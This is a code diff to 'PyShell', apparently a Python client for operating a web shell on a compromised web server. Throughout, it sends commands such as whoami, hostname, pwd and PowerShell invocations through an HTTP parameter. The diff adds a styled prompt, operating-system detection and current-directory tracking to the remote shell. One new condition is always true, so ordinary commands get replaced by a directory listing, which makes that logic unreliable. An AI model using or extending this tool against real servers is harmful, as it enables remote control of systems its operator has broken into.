@@ -44,11 +44,21 @@ try:
     PARAM = args.param
     whoami = send_command('whoami', WEBSHELL, HTTP_METHOD, PARAM)
     hostname = send_command('hostname', WEBSHELL, HTTP_METHOD, PARAM)
+    uname = send_command('uname', WEBSHELL, HTTP_METHOD, PARAM)
+    if uname:
+       path = send_command('pwd', WEBSHELL, HTTP_METHOD, PARAM)
+       slash = '/'
+    else:
+       path = send_command('(pwd).path', WEBSHELL, HTTP_METHOD, PARAM)
+       slash = '\\'
 
     while True:
        try:
-          print (colored("[PyShell] ", "green"), end = '')
-          command = input(colored(str(whoami).rstrip()+"@"+str(hostname).rstrip()+" $> ", "blue"))
+          print (colored(" [PyShell] ", "grey", "on_green"), end = '') ; print (colored(" ", "green", "on_blue"), end = '')
+          print (colored(str(whoami).rstrip()+"@"+str(hostname).rstrip()+" ", "grey", "on_blue"), end = '')
+          print (colored(" ", "blue", "on_yellow"), end = '') ; print (colored(path.rstrip()+" ", "grey", "on_yellow"), end = '')
+          print (colored(" ", "yellow"), end = '')
+          command = input()
           if command == "exit":
              print (colored("Exiting..\n", "red"))
              break
@@ -70,12 +80,26 @@ try:
                    f.write(download)
                    f.close
                 else:
-                   if args.ps:
-                      result = send_command("powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
-                      print (colored(result, "yellow"))
+                   if "cd" in command.split()[0]:
+                      if ".." in command.split()[1]:
+                         path = path.split(slash)[:-1]
+                         path = (slash.join(path))
+                      else:
+                         if not slash in command.split()[1]:
+                            path = path + slash + command.split()[1]
+                         else:
+                            path = command.split()[1]   
                    else:
-                      result = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
-                      print (colored(result, "yellow"))
+                      if "ls" or "dir" in command.split()[0]:
+                         result = send_command("ls " + path, WEBSHELL, HTTP_METHOD, PARAM) 
+                         print (colored(result, "yellow"))
+                      else:
+                         if args.ps:
+                            result = send_command("powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
+                            print (colored(result, "yellow"))
+                         else:
+                            result = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
+                            print (colored(result, "yellow"))
 
        except KeyboardInterrupt:
           print (colored("\nExiting..\n", "red"))
